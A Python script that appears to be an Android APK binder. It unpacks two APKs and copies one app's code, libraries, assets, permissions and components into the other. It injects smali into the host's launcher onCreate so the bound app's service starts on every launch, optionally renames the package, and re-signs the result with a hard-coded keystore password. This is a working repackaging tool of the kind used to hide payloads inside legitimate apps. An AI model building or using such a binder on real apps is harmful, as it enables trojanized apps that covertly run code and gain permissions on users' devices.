# coding:utf8

import os
import re
import subprocess
import shutil
from functools import reduce
from os.path import abspath

import sys

try:
    import xml.etree.cElementTree as ET
except ImportError:
    import xml.etree.ElementTree as ET

curDir = os.path.split(os.path.abspath(sys.argv[0]))[0]
print("file dir " + curDir)
outDir = curDir + '/../out'
apktool = curDir + '/../tools/apktool_2.3.1.jar'
# srcApk = '../com.csfo.omys___pie.apk'
# targetApk = '../app-release.apk'
aapt = curDir + '/../tools/aapt.exe'

key = '{http://schemas.android.com/apk/res/android}name'

keystory_alias_password = "123123"
keystory_store_password = "123123"
# keystory_store = "../Everychange.key"
# keystory_alias = "com.moe.omo"

tmpApk = "tmp.apk"


def unpack(src, dist):
    dist = os.path.join(dist, fileName(src))

    print("[+] unpack: " + src)
    if os.path.exists(dist):
        shutil.rmtree(dist)

    cmd = ['java', '-jar', os.path.abspath(apktool), 'd', src, '-f', '-o', dist]
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        code = process.wait()
        if not code == 0:
            raise Exception("unpack failed:" + str(stderr.decode("utf-8")))
        else:
            pass
            # print("[+] " + str(stdout, encoding="utf-8"))
    except Exception as e:
        print('[-]' + str(e))
        raise e


def copytree(src, dst, symlinks=False):
    names = os.listdir(src)
    if not os.path.isdir(dst):
        os.makedirs(dst)
    errors = []
    for name in names:
        srcname = os.path.join(src, name)
        dstname = os.path.join(dst, name)
        try:
            if symlinks and os.path.islink(srcname):
                linkto = os.readlink(srcname)
                os.symlink(linkto, dstname)
            elif os.path.isdir(srcname):
                copytree(srcname, dstname, symlinks)
            else:
                if os.path.isdir(dstname):
                    os.rmdir(dstname)
                elif os.path.isfile(dstname):
                    os.remove(dstname)
                shutil.copy2(srcname, dstname)
        except (IOError, os.error) as why:
            errors.append((srcname, dstname, str(why)))
        except OSError as err:
            errors.extend(err.args[0])

        try:
            shutil.copystat(src, dst)
        except WindowsError:
            pass
        except OSError as why:
            errors.extend((src, dst, str(why)))
        if errors:
            raise shutil.Error(errors)


def fileName(f):
    return os.path.basename(f).split('.apk')[0]


def rePackage(src, dst):
    try:
        src = os.path.abspath(os.path.normpath(src))
        print("[+] repackage ", src, " -> ", dst)
        cmd = ['java', '-jar', apktool, 'b', src, '-f', '-o', dst]
        p = subprocess.Popen(cmd)
        p.wait()
    except Exception as e:
        print("[-]" + str(e))
        exit(-1)


def main():
    # process()
    pass


def process(src, dst, keyalias, keydir, rpackename):
    global servicePckName
    srcApk = src
    targetApk = dst
    keystory_alias = keyalias
    out_src_dir = os.path.join(outDir, fileName(srcApk))
    out_dst_dir = os.path.join(outDir, fileName(targetApk))
    apks = [srcApk, targetApk]
    for apk in apks:
        unpack(os.path.abspath(apk), os.path.abspath(outDir))
    mergeApk(out_dst_dir, out_src_dir, rpackename)
    tmpApk_dir = os.path.join(outDir, tmpApk)
    signApk_dir = os.path.join(outDir, fileName(targetApk) + ".apk")
    rePackage(out_dst_dir, abspath(tmpApk_dir))
    signApk(abspath(tmpApk_dir), abspath(signApk_dir), keystory_alias, abspath(keydir))

    removeTempFiles(tmpApk_dir)


def removeTempFiles(tmpApk_dir):
    print("[**] remove temporary files....")
    try:
        os.remove(abspath(tmpApk_dir))
        for dir in os.listdir(abspath(outDir)):
            file = os.path.join(abspath(outDir), dir);
            if os.path.isdir(file):
                shutil.rmtree(file)
    except:
        pass

    print("[+] packed finish!!")


def mergeApk(out_dst_dir, out_src_dir, rePackageName):
    dstManifestDir, srcManifestDir = copy_srcapk_file(out_dst_dir, out_src_dir)
    dst_activityList, dst_root, src_root = mergeManifest(dstManifestDir, srcManifestDir, rePackageName)
    setStartService(dst_activityList, dst_root, out_dst_dir, src_root)


def setStartService(dst_activityList, dst_root, out_dst_dir, src_root):
    global servicePckName
    onCreateClass = dst_root.find("application").attrib.get(key, None)
    servicePckName = getSourceServiceNameList(src_root)[0].replace(".", "/")
    print("[+] " + servicePckName)
    if onCreateClass == None:
        for activity in dst_activityList:
            for i in activity.findall('intent-filter'):
                actions = i.findall('action')
                category = i.findall('category')
                l = [a.attrib.get(key) for a in actions]
                l += [a.attrib.get(key) for a in category]

                if 'android.intent.action.MAIN' in l and 'android.intent.category.LAUNCHER' in l:
                    onCreateClass = activity.attrib.get(key)
                    break

    if not onCreateClass:
        raise Exception("find onCreate fail!")

    print("[+] " + onCreateClass)
    classPath = os.path.join(out_dst_dir, "smali", onCreateClass.replace('.', '/') + ".smali")
    wstr = ""
    with open(os.path.normpath(classPath)) as f:
        match = False
        inject = False
        for line in f:
            if re.search("^\.method (protected|public) onCreate\((Landroid/os/Bundle;)?\)V$", line):
                print("[+] %s find onCreate: %s" % (onCreateClass, line))
                match = True

            if re.search("\.end method", line) and match:
                match = False
                inject = True

            if match:
                if re.search("return-void", line):
                    oldline = line
                    line = "\n\tnew-instance v0, Landroid/content/Intent;\n\n" \
                           "\tconst-class v1, L" + servicePckName + ";\n\n" \
                                                                    "\tinvoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n\n" \
                                                                    "\tinvoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n\n"

                    line += oldline

                if re.search("\.locals (\d)", line):
                    pattern = re.match("(\s*\.locals )(\d)", line)
                    if int(pattern.group(2)) < 3:
                        line = pattern.group(1) + "3\n"

            wstr += line
        f.close()
        if not inject:
            raise Exception("set start service failed! " + onCreateClass)
    with open(classPath, 'w') as f:
        f.writelines(wstr)
        f.close()


def mergeManifest(dstManifestDir, srcManifestDir, rpackename):
    src_tree = parse_Manifest(srcManifestDir)
    src_root = src_tree.getroot()
    dst_tree = parse_Manifest(dstManifestDir)
    dst_root = dst_tree.getroot()
    src_perm = getSourcePermList(src_root)
    dst_perm = getSourcePermList(dst_root)
    # dst_perm = list(src_perm.union(dst_perm))
    # dst_perm = reduce(a, [[], ] + dst_perm)
    dst_perm = NameDifference(src_perm, dst_perm)
    metaDataList = getSourceMetadataList(src_root)
    serviceList = getSourceServiceList(src_root)
    activityList = getSourceActList(src_root)
    receiverList = getSourceReceiverList(src_root)
    dst_metaDataList = getSourceMetadataList(dst_root)
    dst_serviceList = getSourceServiceList(dst_root)
    dst_activityList = getSourceActList(dst_root)
    dst_receiverList = getSourceReceiverList(dst_root)
    metaDataList = NameDifference(metaDataList, dst_metaDataList)
    serviceList = NameDifference(serviceList, dst_serviceList)
    activityList = NameDifference(activityList, dst_activityList)
    receiverList = NameDifference(receiverList, dst_receiverList)
    # print(getSourceMetadataList(src_root))
    for perm in dst_perm:
        dst_root.append(perm)
    for a in dst_root.iter("application"):
        for metadata in metaDataList:
            a.insert(0, metadata)
        for service in serviceList:
            a.append(service)
        for activity in activityList:
            a.append(activity)
        for receiver in receiverList:
            a.append(receiver)
    for i in dst_root:
        for child in i:
            child.tail = '\n\t\t'
    if rpackename:
        dst_root.set("package", rpackename)
    dst_tree.write(dstManifestDir, encoding="utf-8", xml_declaration=True)
    return dst_activityList, dst_root, src_root


def parse_Manifest(srcManifestDir):
    ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
    src_tree = ET.parse(srcManifestDir)
    return src_tree


def copy_srcapk_file(out_dst_dir, out_src_dir):
    srcAssetsDir = os.path.join(out_src_dir, 'assets')
    dstAssetsDir = os.path.join(out_dst_dir, 'assets')
    copytree(os.path.abspath(srcAssetsDir), os.path.abspath(dstAssetsDir))
    srclibDir = os.path.join(out_src_dir, 'lib/armeabi')
    dstlibDir = os.path.join(out_dst_dir, 'lib/armeabi')
    copytree(os.path.abspath(srclibDir), os.path.abspath(dstlibDir))
    srcsmaliDir = os.path.join(out_src_dir, 'smali')
    dstsmaliDir = os.path.join(out_dst_dir, 'smali')
    copytree(os.path.abspath(srcsmaliDir), os.path.abspath(dstsmaliDir))
    srcManifestDir = os.path.join(out_src_dir, 'AndroidManifest.xml')
    dstManifestDir = os.path.join(out_dst_dir, 'AndroidManifest.xml')
    return dstManifestDir, srcManifestDir


def signApk(src, dst, keystory_alias, keystory):
    try:
        print("[+] " + "signApk start....", "\nscr: " + src, "dst: " + dst, "\nkeystory: " + keystory, "\nalias:" + keystory_alias)
        cmd = ['jarsigner',  '-keystore', keystory,
               '-storepass', keystory_store_password, '-keypass', keystory_alias_password, '-signedjar', dst, src,
               keystory_alias]
        p = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = p.communicate()
        print("[+] ", stdout.decode("gb2312"))
        code = p.wait()
        if not code == 0:
            print("[-] sign failed: ", stdout.decode("gb2312"))
            exit(-1)
        else:
            print("[+] sign success! -> " + dst)
    except Exception as e:
        print("[-] " + str(e))
        exit(-1)

def a(x, y):
    for a in x:
        if a.attrib == y.attrib:
            return x
    return x + [y]


def getAppBaseInfo(apkpath):
    apkpath = os.path.abspath(apkpath)
    if not os.path.exists(apkpath):
        print("[*] not exists " + apkpath)
    print("[+] " + os.path.abspath(aapt))
    p = subprocess.Popen("%s d badging %s" % (os.path.abspath(aapt), os.path.normpath(apkpath)), shell=True, stdout=subprocess.PIPE)
    # stdout.read().decode("utf")
    # print("[+] " + str(stdout.read().encode("utf-8")))
    l = str(p.stdout.readline().decode("utf-8"))
    print(l)
    match = re.compile(
        "package: name='(\S+)' versionCode='(\d+)' versionName='(\S+)'.*").match(l)
    if not match:
        raise Exception("can't get packageinfo")
    packagename = match.group(1)
    versionCode = match.group(2)
    versionName = match.group(3)
    return packagename, versionCode, versionName


def NameDifference(src, dst):
    df = {}
    for s in src:
        df[s.attrib.get(key)] = s
        for d in dst:
            if d.attrib == s.attrib:
                df.pop(s.attrib.get(key), None)
                break
            else:
                df[s.attrib.get(key)] = s

    return df.values()


def getSourcePermList(doc):
    return doc.findall('uses-permission')


def getSourcePermName(doc):
    nodelist = doc.findall('uses-permission')
    act_list = []
    for node in nodelist:
        act_list.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return act_list


def getSourcePackageName(manifestDir):
    return parse_Manifest(manifestDir).getroot().get("package")


def getSourceActList(doc):
    return doc.findall('application/activity')


def getSourceActNameList(doc):
    nodelist = doc.findall('application/activity')
    act_list = []
    for node in nodelist:
        act_list.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return act_list


def getSourceReceiverList(doc):
    return doc.findall('application/receiver')


def getSourceReceiverNameList(doc):
    nodelist = doc.findall('application/receiver')
    receiverList = []
    for node in nodelist:
        receiverList.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return receiverList


def getSourceServiceList(doc):
    return doc.findall('application/service')


def getSourceServiceNameList(doc):
    nodelist = doc.findall('application/service')
    serviceList = []
    for node in nodelist:
        serviceList.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return serviceList


def getSourceMetadataList(doc):
    return doc.findall('application/meta-data')


if __name__ == "__main__":
    main()
